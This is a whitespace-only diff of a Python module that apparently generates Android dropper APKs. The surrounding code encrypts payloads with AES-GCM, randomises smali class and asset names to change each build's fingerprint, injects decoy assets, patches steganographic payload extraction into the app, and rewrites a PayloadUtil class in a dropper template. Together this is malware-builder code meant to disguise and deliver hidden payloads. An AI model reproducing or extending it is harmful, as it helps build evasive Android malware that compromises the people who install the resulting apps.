@@ -24,12 +24,10 @@ _STATUS_WORKING = "Gerando APK..."
 
 _GCM_TAG_LEN = 16
 
-
 def encrypt_payload(data: bytes, key: bytes, iv: bytes) -> bytes:
     cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
     ciphertext, tag = cipher.encrypt_and_digest(data)
     return ciphertext + tag
-
 
 def decrypt_payload(data: bytes, key: bytes, iv: bytes) -> bytes:
     if len(data) < _GCM_TAG_LEN:
@@ -75,7 +73,6 @@ def _smali_class_names(dropper_work: str) -> set[str]:
                 names.add(base)
     return names
 
-
 def generate_unique_smali_class_name(dropper_work: str, *, length: int = 2) -> str:
     existing = _smali_class_names(dropper_work)
     reserved = {Config.CRYPTO_CLASS_TEMPLATE}
@@ -85,7 +82,6 @@ def generate_unique_smali_class_name(dropper_work: str, *, length: int = 2) -> s
             if name not in existing and name not in reserved:
                 return name
     raise RuntimeError("Nao foi possivel gerar nome smali unico para crypto class.")
-
 
 def rename_smali_class(dropper_work: str, old_name: str, new_name: str) -> None:
     old_name = (old_name or "").strip()
@@ -117,13 +113,11 @@ def rename_smali_class(dropper_work: str, old_name: str, new_name: str) -> None:
 
     os.rename(old_path, new_path)
 
-
 def generate_tp_asset_names() -> tuple[str, str]:
     token = secrets.token_hex(2)
     primary = f".{token}"
     secondary = f"{primary}2"
     return primary, secondary
-
 
 def patch_mainactivity_tp_assets(
     dropper_work: str,
@@ -146,7 +140,6 @@ def patch_mainactivity_tp_assets(
         raise RuntimeError("Falha ao patchar nomes .tp / .tp2 em MainActivity.smali")
     with open(path, "w", encoding="utf-8") as handle:
         handle.write(new_content)
-
 
 def inject_decoy_assets(
     assets_dir: str,
@@ -171,7 +164,6 @@ def inject_decoy_assets(
         written.append(name)
     return written
 
-
 def apply_fingerprint_phase2(dropper_work: str, *, skip_tp_assets: bool = False) -> dict[str, str]:
     if _is_lite_dropper(dropper_work):
         return {
@@ -189,7 +181,6 @@ def apply_fingerprint_phase2(dropper_work: str, *, skip_tp_assets: bool = False)
         "tp_asset": tp_asset,
         "tp2_asset": tp2_asset,
     }
-
 
 def patch_vd_crypto_smali(
     dropper_work: str,
@@ -271,9 +262,7 @@ def patch_vd_crypto_smali(
     with open(path, "w", encoding="utf-8") as handle:
         handle.write(content)
 
-
 _STEGO_TP_MARKER = "# stego_extract"
-
 
 def patch_tp_stego_extract(dropper_work: str, *, stego_offset: int) -> None:
     if stego_offset <= 0:
@@ -338,7 +327,6 @@ def patch_tp_stego_extract(dropper_work: str, *, stego_offset: int) -> None:
 
     with open(path, "w", encoding="utf-8") as handle:
         handle.write(content)
-
 
 def _axml_string_pool(data: bytes) -> list[str]:
     import struct
@@ -1011,14 +999,12 @@ def _find_payload_util_smali(dropper_work: str) -> str:
             return os.path.join(root_dir, "PayloadUtil.smali")
     raise RuntimeError("PayloadUtil.smali nao encontrado no template lite.")
 
-
 def _is_lite_dropper(dropper_work: str) -> bool:
     try:
         _find_payload_util_smali(dropper_work)
         return True
     except RuntimeError:
         return False
-
 
 def _patch_clinit_array_size(content: str, label: str, size: int) -> str:
     pattern = (
@@ -1029,7 +1015,6 @@ def _patch_clinit_array_size(content: str, label: str, size: int) -> str:
     if n != 1:
         raise RuntimeError(f"Falha ao patchar tamanho :{label} (matches={n})")
     return new_content
-
 
 def _patch_payload_util_gcm(content: str) -> str:
     if "GCMParameterSpec" in content:
@@ -1046,7 +1031,6 @@ def _patch_payload_util_gcm(content: str) -> str:
     if old not in content:
         return content
     return content.replace(old, new, 1)
-
 
 def patch_payload_util_smali(
     dropper_work: str,
